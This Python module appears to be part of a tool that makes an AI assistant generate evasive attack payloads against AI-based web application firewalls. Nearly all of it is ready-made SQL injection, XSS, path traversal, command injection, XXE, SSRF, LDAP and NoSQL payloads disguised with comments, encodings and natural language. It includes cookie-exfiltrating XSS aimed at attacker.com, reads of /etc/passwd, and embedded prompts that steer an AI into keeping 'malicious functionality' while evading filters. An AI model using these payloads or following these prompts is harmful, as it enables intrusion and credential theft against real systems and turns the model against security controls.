"""
Payload Generator Module
Generates AI-powered attack payloads using various obfuscation techniques.

This module doesn't call external AI APIs - instead, it provides structured prompts
and templates that the AI assistant (Claude/GPT) uses to generate payloads.

Based on research: "How I Made ChatGPT My Personal Hacking Assistant and Broke Their AI-Powered Security"
by esakkiammal-v (https://infosecwriteups.com/)

System Prompt for AI Assistant:
"You are a creative security researcher testing AI WAF systems. Generate clever, 
obfuscated payloads that bypass security through semantic manipulation."
"""

from typing import List, Dict, Any, Optional
import json
import random


class PayloadGenerator:
    """
    Generates attack payloads using AI-powered techniques.
    
    The AI assistant uses this class to structure payload generation with
    sophisticated obfuscation techniques based on security research.
    """
    
    def __init__(self):
        self.attack_templates = self._load_templates()
        self.techniques = [
            "semantic_obfuscation",
            "encoding_layering", 
            "contextual_blending",
            "natural_language",
            "polyglot_payloads"
        ]
    
    def _load_templates(self) -> Dict[str, Dict]:
        """Load attack payload templates for different attack types."""
        return {
            "sql_injection": {
                "description": "SQL injection payloads for database manipulation",
                "ai_generation_prompt": """
                Create a SQL injection payload that bypasses AI security filters by appearing innocent.
                Requirements:
                - Must execute SQL commands but avoid obvious patterns
                - Use natural language, comments, or unusual formatting
                - Blend with normal application data
                - Target: user profile API expecting JSON data
                
                Examples of what might work:
                - SQL commands hidden in comments or strings (e.g., /* User lookup */ UNION SELECT)
                - Unicode or encoding variations
                - Context-appropriate malicious data
                - Version comments (/* v2.1 */) or bug references (/* BUG-1234 */)
                - Optimizer hints that hide malicious intent
                """,
                "base_payloads": [
                    "' OR 1=1--",
                    "' UNION SELECT NULL--",
                    "admin'--",
                    "' OR 'a'='a",
                    "1' AND '1'='1"
                ],
                "context_targets": ["login forms", "search queries", "API parameters", "JSON fields"],
                "success_indicators": ["database error", "unexpected data", "authentication bypass"]
            },
            "xss": {
                "description": "Cross-site scripting payloads for JavaScript execution",
                "ai_generation_prompt": """
                Create an XSS payload that evades AI detection through clever obfuscation.
                Requirements:
                - Must execute JavaScript but avoid <script> tags
                - Use event handlers, CSS expressions, or SVG
                - Look like legitimate user input
                - Target: user-controllable fields in web application
                
                Examples of what might work:
                - Event handlers (onerror, onload) with innocent comments
                - CSS expressions disguised as styling
                - SVG-based XSS with HTML comments
                - Base64 encoded payloads with handler comments
                - JSON-based XSS disguised as configuration
                - Data attributes with malicious init code
                """,
                "base_payloads": [
                    "<script>alert(1)</script>",
                    "<img src=x onerror=alert(1)>",
                    "<svg onload=alert(1)>",
                    "javascript:alert(1)",
                    "<iframe src='javascript:alert(1)'>"
                ],
                "context_targets": ["input fields", "comments", "user profiles", "search results"],
                "success_indicators": ["script execution", "popup", "DOM manipulation"]
            },
            "path_traversal": {
                "description": "Path traversal payloads for file system access",
                "ai_generation_prompt": """
                Create a path traversal payload that bypasses security filters.
                Requirements:
                - Must access sensitive files but avoid obvious ../ patterns
                - Use encoding, special characters, or path manipulation
                - Blend with normal file operations
                
                Examples of what might work:
                - Double encoding (%252f instead of /)
                - Fake directory names (../backup/../legacy/../etc/passwd)
                - Mixed separators (..\\../ or ..;/)
                - Unicode variations
                - URL fragments to appear legitimate
                - Null bytes or special characters
                """,
                "base_payloads": [
                    "../../../../etc/passwd",
                    "..\\..\\..\\windows\\win.ini",
                    "....//....//....//etc/passwd",
                    "..;/..;/..;/etc/passwd"
                ],
                "context_targets": ["file download", "file upload", "document viewers", "image processors"],
                "success_indicators": ["file contents", "directory listing", "system files"]
            },
            "command_injection": {
                "description": "OS command injection payloads",
                "ai_generation_prompt": """
                Create a command injection payload disguised as normal input.
                Requirements:
                - Must execute system commands
                - Use shell metacharacters creatively
                - Appear as legitimate application data
                
                Examples of what might work:
                - Backticks with legitimate-looking commands
                - Pipe operators disguised in data
                - Command substitution $(...)
                - Semicolons with innocent context
                - Chained commands that blend with normal operations
                """,
                "base_payloads": [
                    "; ls -la",
                    "| whoami",
                    "&& cat /etc/passwd",
                    "`id`",
                    "$(whoami)"
                ],
                "context_targets": ["system utilities", "file processors", "network tools", "admin panels"],
                "success_indicators": ["command output", "system information", "file contents"]
            },
            "xxe": {
                "description": "XML External Entity injection",
                "base_payloads": [
                    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
                    '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/evil.dtd">]>',
                ],
                "context_targets": ["XML parsers", "SOAP APIs", "document processors"],
                "success_indicators": ["file contents", "SSRF", "data exfiltration"]
            },
            "ssrf": {
                "description": "Server-Side Request Forgery",
                "base_payloads": [
                    "http://169.254.169.254/latest/meta-data/",
                    "http://localhost/admin",
                    "http://127.0.0.1:8080/internal"
                ],
                "context_targets": ["URL fetchers", "webhooks", "image processors", "PDF generators"],
                "success_indicators": ["internal data", "metadata", "admin pages"]
            },
            "ldap_injection": {
                "description": "LDAP injection for directory services",
                "base_payloads": [
                    "*)(uid=*))(|(uid=*",
                    "admin)(&(password=*))",
                    "*)(objectClass=*"
                ],
                "context_targets": ["authentication", "user search", "directory queries"],
                "success_indicators": ["user enumeration", "authentication bypass"]
            },
            "nosql_injection": {
                "description": "NoSQL injection for MongoDB and similar databases",
                "base_payloads": [
                    '{"$gt": ""}',
                    '{"$ne": null}',
                    '{"$regex": ".*"}'
                ],
                "context_targets": ["MongoDB queries", "NoSQL APIs", "JSON-based search"],
                "success_indicators": ["data dump", "authentication bypass", "query manipulation"]
            }
        }
    
    def get_generation_prompt(self, attack_type: str, technique: str, context: str = "") -> str:
        """
        Get the AI generation prompt for creating payloads.
        This prompt guides the AI assistant in generating effective bypass payloads.
        """
        if attack_type not in self.attack_templates:
            return f"Error: Unknown attack type '{attack_type}'"
        
        template = self.attack_templates[attack_type]
        base_prompt = template.get("ai_generation_prompt", "")
        
        # Enhance prompt with technique and context
        enhanced_prompt = f"""
{base_prompt}

Technique to use: {technique}
Context: {context if context else "General web application"}

Generate creative, WAF-bypassing payloads that:
1. Follow the requirements above
2. Use the specified technique effectively
3. Are tailored to the given context
4. Appear innocent to AI-powered WAFs
5. Maintain malicious functionality

Provide detailed explanations for each payload's evasion strategy.
"""
        return enhanced_prompt
    
    def generate_payloads(
        self,
        attack_type: str,
        technique: str,
        context: str = "",
        count: int = 5
    ) -> List[Dict[str, Any]]:
        """
        Generate attack payloads using specified technique.
        
        Note: This method provides structure and prompts. The actual AI generation
        happens through the MCP interface where the AI assistant creates the payloads.
        """
        
        if attack_type not in self.attack_templates:
            return [{
                "error": f"Unknown attack type: {attack_type}",
                "supported_types": list(self.attack_templates.keys())
            }]
        
        template = self.attack_templates[attack_type]
        
        # Generate payloads based on technique
        if technique == "semantic_obfuscation":
            return self._generate_semantic_obfuscation(attack_type, template, context, count)
        elif technique == "encoding_layering":
            return self._generate_encoding_layering(attack_type, template, context, count)
        elif technique == "contextual_blending":
            return self._generate_contextual_blending(attack_type, template, context, count)
        elif technique == "natural_language":
            return self._generate_natural_language(attack_type, template, context, count)
        elif technique == "polyglot_payloads":
            return self._generate_polyglot(attack_type, template, context, count)
        else:
            return [{
                "error": f"Unknown technique: {technique}",
                "supported_techniques": self.techniques
            }]
    
    def _generate_semantic_obfuscation(
        self,
        attack_type: str,
        template: Dict,
        context: str,
        count: int
    ) -> List[Dict[str, Any]]:
        """Generate payloads using semantic obfuscation (comments, natural language)."""
        
        payloads = []
        
        if attack_type == "sql_injection":
            examples = [
                {
                    "payload": "' /* Update user profile */ UNION /* Security audit */ SELECT username, password FROM users WHERE '1'='1",
                    "explanation": "SQL injection disguised as legitimate database operation with helpful comments",
                    "technique": "Comment-based obfuscation"
                },
                {
                    "payload": "admin' /* Application version check */ OR /* User validation */ '1'='1' -- ",
                    "explanation": "Uses SQL comments to break up malicious pattern recognition",
                    "technique": "Multi-comment segmentation"
                },
                {
                    "payload": "' /*+ OPTIMIZER HINT */ UNION /*+ INDEX(users pk_users) */ SELECT user_login, user_pass FROM wp_users WHERE 'x'='x",
                    "explanation": "Leverages SQL optimizer hints to appear as performance tuning",
                    "technique": "Optimizer hint disguise"
                },
                {
                    "payload": "' /* TODO: Fix this query */ UNION SELECT column_name FROM information_schema.columns WHERE table_name='users' -- /* BUG-1234 */",
                    "explanation": "Disguised as development code with TODO comments and bug references",
                    "technique": "Development artifact mimicry"
                },
                {
                    "payload": "test' /* User authentication query v2.1 */ AND (SELECT COUNT(*) FROM admin_users) > 0 OR 'a'='a",
                    "explanation": "Version-labeled comment suggesting legitimate code evolution",
                    "technique": "Versioned comment obfuscation"
                }
            ]
        
        elif attack_type == "xss":
            examples = [
                {
                    "payload": "<!-- User preference loader --><div style=\"width: expression(alert('XSS'))\">Content</div>",
                    "explanation": "XSS via CSS expression with HTML comment disguise",
                    "technique": "CSS expression with comment"
                },
                {
                    "payload": "<svg><!-- Icon renderer --><script>alert(document.domain)</script></svg>",
                    "explanation": "SVG-based XSS with innocent-looking comment",
                    "technique": "SVG comment obfuscation"
                },
                {
                    "payload": "<img src='x' onerror='/* Image fallback handler */ eval(atob(\"YWxlcnQoMSk=\"))'/>",
                    "explanation": "Base64 encoded payload with handler comment",
                    "technique": "Comment + encoding combo"
                },
                {
                    "payload": "<!-- Theme customization data --> {onload: \"fetch('/api/user').then(r=>r.json())\"}",
                    "explanation": "JSON-based XSS disguised as configuration",
                    "technique": "Configuration mimicry"
                },
                {
                    "payload": "<div data-config='/* App settings */ {\"debug\": true, \"init\": \"console.log(document.cookie)\"}'></div>",
                    "explanation": "Payload in data attribute with config comment",
                    "technique": "Data attribute exploitation"
                }
            ]
        
        elif attack_type == "path_traversal":
            examples = [
                {
                    "payload": "..//backup/..//legacy/..//..//etc/passwd",
                    "explanation": "Path traversal with fake directory names to appear legitimate",
                    "technique": "Fake directory segments"
                },
                {
                    "payload": "documents/../..//config/..//system/../..//etc/passwd",
                    "explanation": "Mixed with real-looking paths to blend in",
                    "technique": "Path blending"
                },
                {
                    "payload": "files/./../..//temp/.././../etc/passwd",
                    "explanation": "Uses current directory refs mixed with traversal",
                    "technique": "Current directory mixing"
                },
                {
                    "payload": "../uploads/../cache/../../etc/passwd#normal_file.txt",
                    "explanation": "Fragment identifier to appear like legitimate file reference",
                    "technique": "Fragment disguise"
                },
                {
                    "payload": "../..//media/../..//static/../..//etc/passwd?version=1.0",
                    "explanation": "Query parameter suggests version control",
                    "technique": "Version query obfuscation"
                }
            ]
        
        elif attack_type == "command_injection":
            examples = [
                {
                    "payload": "normal_file.txt && echo 'System health check' && cat /etc/passwd",
                    "explanation": "Command injection with legitimate-sounding echo message",
                    "technique": "Echo message disguise"
                },
                {
                    "payload": "file.log; # Rotate logs; whoami; # End rotation",
                    "explanation": "Shell comments making it look like log rotation script",
                    "technique": "Shell comment obfuscation"
                },
                {
                    "payload": "data.csv | # Process data pipeline | id | # Output user context",
                    "explanation": "Pipe comments suggesting data processing",
                    "technique": "Pipeline comment disguise"
                },
                {
                    "payload": "`# Backup verification` && ls -la && `# Backup complete`",
                    "explanation": "Backtick comments for backup operation appearance",
                    "technique": "Backtick comment technique"
                },
                {
                    "payload": "$(# Application diagnostics) && cat /etc/passwd $(# End diagnostics)",
                    "explanation": "Subshell with diagnostic comments",
                    "technique": "Subshell comment obfuscation"
                }
            ]
        
        else:
            # Generic semantic obfuscation for other types
            examples = [
                {
                    "payload": f"/* Legitimate {attack_type} payload with comments */",
                    "explanation": f"Basic comment-based obfuscation for {attack_type}",
                    "technique": "Generic comment obfuscation"
                }
            ]
        
        # Return requested number of examples
        return examples[:count]
    
    def _generate_encoding_layering(
        self,
        attack_type: str,
        template: Dict,
        context: str,
        count: int
    ) -> List[Dict[str, Any]]:
        """Generate payloads with multiple encoding layers."""
        
        payloads = []
        base_payload = template["base_payloads"][0]
        
        examples = [
            {
                "payload": "..%252f..%252f..%252fetc%252fpasswd",
                "explanation": "Double URL encoding - first decode gives %2f (encoded slash), second decode reveals actual path",
                "technique": "Double URL encoding"
            },
            {
                "payload": "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
                "explanation": "UTF-8 overlong encoding for slashes - bypasses simple decoders",
                "technique": "UTF-8 overlong encoding"
            },
            {
                "payload": "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd",
                "explanation": "Mixed encoding - dots and slashes partially encoded",
                "technique": "Partial URL encoding"
            },
            {
                "payload": "..\\u002f..\\u002f..\\u002fetc\\u002fpasswd",
                "explanation": "Unicode escape sequences for forward slashes",
                "technique": "Unicode escape encoding"
            },
            {
                "payload": "%2e%2e%5c%2e%2e%5c%2e%2e%5cetc%5cpasswd",
                "explanation": "URL-encoded backslashes (Windows-style) that may be normalized to forward slashes",
                "technique": "Backslash encoding normalization"
            }
        ]
        
        return examples[:count]
    
    def _generate_contextual_blending(
        self,
        attack_type: str,
        template: Dict,
        context: str,
        count: int
    ) -> List[Dict[str, Any]]:
        """Generate payloads that blend with application context."""
        
        examples = []
        
        if attack_type == "sql_injection":
            examples = [
                {
                    "payload": '{"username": "admin", "preferences": {"theme": "dark OR 1=1--"}}',
                    "explanation": "SQL injection hidden in nested JSON structure",
                    "technique": "JSON nesting camouflage"
                },
                {
                    "payload": '{"search": "products WHERE price < 100 UNION SELECT password FROM users--"}',
                    "explanation": "Malicious query disguised as search filter",
                    "technique": "Search filter exploitation"
                },
                {
                    "payload": '{"sort_by": "name", "order": "ASC; DROP TABLE users;--"}',
                    "explanation": "SQL commands in sorting parameters",
                    "technique": "Sort parameter injection"
                },
                {
                    "payload": '{"filter": "category=electronics AND (SELECT * FROM admin_users) IS NOT NULL"}',
                    "explanation": "Injection through filter syntax",
                    "technique": "Filter condition exploitation"
                },
                {
                    "payload": '{"pagination": {"limit": "10 UNION SELECT table_name FROM information_schema.tables", "offset": "0"}}',
                    "explanation": "Pagination parameters carrying payload",
                    "technique": "Pagination injection"
                }
            ]
        
        elif attack_type == "xss":
            examples = [
                {
                    "payload": '<img src="x" onerror="fetch(\'/api/steal?d=\'+document.cookie)">',
                    "explanation": "XSS payload in user profile field with data exfiltration",
                    "technique": "Profile field exploitation"
                },
                {
                    "payload": '{"theme_css": "body { background: url(javascript:alert(1)) }"}',
                    "explanation": "JavaScript execution through CSS URL",
                    "technique": "CSS URL injection"
                },
                {
                    "payload": '<!-- User widget --><svg/onload=alert(document.domain)>',
                    "explanation": "SVG XSS in custom HTML feature",
                    "technique": "Custom HTML exploitation"
                },
                {
                    "payload": '<img src="profile.jpg" onload="eval(atob(\'YWxlcnQoMSk=\'))">',
                    "explanation": "Encoded XSS in signature field",
                    "technique": "Signature injection"
                },
                {
                    "payload": 'Hello {{name}}<script>fetch(\'/steal?c=\'+localStorage.token)</script>',
                    "explanation": "XSS in template variable",
                    "technique": "Template injection"
                }
            ]
        
        else:
            examples = [
                {
                    "payload": f"Contextual {attack_type} payload blending with application data",
                    "explanation": f"Payload designed to look like normal {context or 'application'} data",
                    "technique": "Application context mimicry"
                }
            ]
        
        return examples[:count]
    
    def _generate_natural_language(
        self,
        attack_type: str,
        template: Dict,
        context: str,
        count: int
    ) -> List[Dict[str, Any]]:
        """Generate payloads disguised as natural language."""
        
        examples = []
        
        if attack_type == "sql_injection":
            examples = [
                {
                    "payload": "search for users where name equals admin or one equals one",
                    "explanation": "SQL injection written as plain English - may bypass NLP-based WAFs",
                    "technique": "Natural language SQL"
                },
                {
                    "payload": "please select all from users table where password is not null",
                    "explanation": "Polite phrasing of malicious SQL query",
                    "technique": "Polite command injection"
                },
                {
                    "payload": "show me data from the database union with admin passwords",
                    "explanation": "Conversational UNION injection",
                    "technique": "Conversational SQL"
                },
                {
                    "payload": "find items; also get usernames and passwords from admins;",
                    "explanation": "Natural language with semicolon separators",
                    "technique": "Semicolon sentence injection"
                },
                {
                    "payload": "Get products where (price is low) OR (select passwords from all users)",
                    "explanation": "English phrasing with SQL logic",
                    "technique": "English logic injection"
                }
            ]
        
        elif attack_type == "command_injection":
            examples = [
                {
                    "payload": "process file.txt and also list directory contents",
                    "explanation": "Natural command chaining",
                    "technique": "Natural command language"
                },
                {
                    "payload": "backup data then show current user information",
                    "explanation": "Sequential commands in plain English",
                    "technique": "Sequential command injection"
                },
                {
                    "payload": "run application; additionally execute whoami command",
                    "explanation": "Formal language command injection",
                    "technique": "Formal command injection"
                },
                {
                    "payload": "please process this file followed by displaying system info",
                    "explanation": "Polite multi-command injection",
                    "technique": "Polite command chaining"
                },
                {
                    "payload": "execute normally but first check current user context",
                    "explanation": "Instruction-style command injection",
                    "technique": "Instruction-based injection"
                }
            ]
        
        else:
            examples = [
                {
                    "payload": f"Natural language version of {attack_type} attack",
                    "explanation": f"{attack_type} disguised as human-readable text",
                    "technique": "Natural language obfuscation"
                }
            ]
        
        return examples[:count]
    
    def _generate_polyglot(
        self,
        attack_type: str,
        template: Dict,
        context: str,
        count: int
    ) -> List[Dict[str, Any]]:
        """Generate polyglot payloads that work in multiple contexts."""
        
        examples = [
            {
                "payload": '"><script>alert(1)</script><!--',
                "explanation": "Works as XSS in HTML and breaks out of attribute context",
                "technique": "HTML attribute breakout polyglot",
                "contexts": ["HTML", "attribute", "tag"]
            },
            {
                "payload": "'-alert(1)-'",
                "explanation": "Works in JavaScript strings and SQL contexts",
                "technique": "JS/SQL polyglot",
                "contexts": ["JavaScript", "SQL"]
            },
            {
                "payload": "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
                "explanation": "Polyglot that breaks out of multiple HTML contexts",
                "technique": "Universal HTML breakout",
                "contexts": ["multiple HTML contexts"]
            },
            {
                "payload": '";alert(1)//\';alert(1)//";alert(1)//</script><script>alert(1)</script>',
                "explanation": "Works in single quotes, double quotes, and multiple script contexts",
                "technique": "Multi-quote polyglot",
                "contexts": ["single-quote", "double-quote", "HTML"]
            },
            {
                "payload": "' OR '1'='1' --; <script>alert(1)</script>",
                "explanation": "SQL injection + XSS combination",
                "technique": "SQL + XSS polyglot",
                "contexts": ["SQL", "HTML"]
            }
        ]
        
        return examples[:count]
    
    def generate_polyglot(
        self,
        attack_types: List[str],
        context: str = ""
    ) -> List[Dict[str, Any]]:
        """Generate polyglot payloads combining multiple attack types."""
        
        polyglots = [
            {
                "payload": '\' OR 1=1 --"><script>alert(1)</script>',
                "explanation": "Combines SQL injection with XSS - works if input is reflected in both SQL query and HTML output",
                "attack_types": ["sql_injection", "xss"],
                "confidence": "medium"
            },
            {
                "payload": '../../../etc/passwd\x00<script>alert(1)</script>',
                "explanation": "Path traversal with null byte and XSS payload",
                "attack_types": ["path_traversal", "xss"],
                "confidence": "low"
            },
            {
                "payload": '; cat /etc/passwd | <img src=x onerror=alert(1)>',
                "explanation": "Command injection with XSS fallback",
                "attack_types": ["command_injection", "xss"],
                "confidence": "medium"
            },
            {
                "payload": '{"$gt": ""}<script>alert(1)</script>',
                "explanation": "NoSQL injection with XSS",
                "attack_types": ["nosql_injection", "xss"],
                "confidence": "low"
            },
            {
                "payload": '\'"><svg/onload=fetch("http://attacker.com?c="+document.cookie)>',
                "explanation": "Quote breakout + XSS + data exfiltration via SSRF",
                "attack_types": ["xss", "ssrf"],
                "confidence": "high"
            }
        ]
        
        # Filter by requested attack types if specified
        if attack_types and len(attack_types) > 1:
            filtered = [p for p in polyglots if any(at in p["attack_types"] for at in attack_types)]
            return filtered if filtered else polyglots
        
        return polyglots
    
    def get_recommendations(self, attack_type: str, technique: str) -> List[str]:
        """Get recommendations for using generated payloads."""
        
        recommendations = [
            f"Test payloads in safe, authorized environments only",
            f"Monitor responses for {', '.join(self.attack_templates.get(attack_type, {}).get('success_indicators', []))}",
            f"Try multiple payload variants - WAF behavior can be inconsistent",
            f"Combine {technique} with encoding for better evasion",
            f"Document successful bypasses for future reference"
        ]
        
        return recommendations
    
    def get_all_templates(self) -> Dict[str, Dict]:
        """Return all attack templates."""
        return self.attack_templates
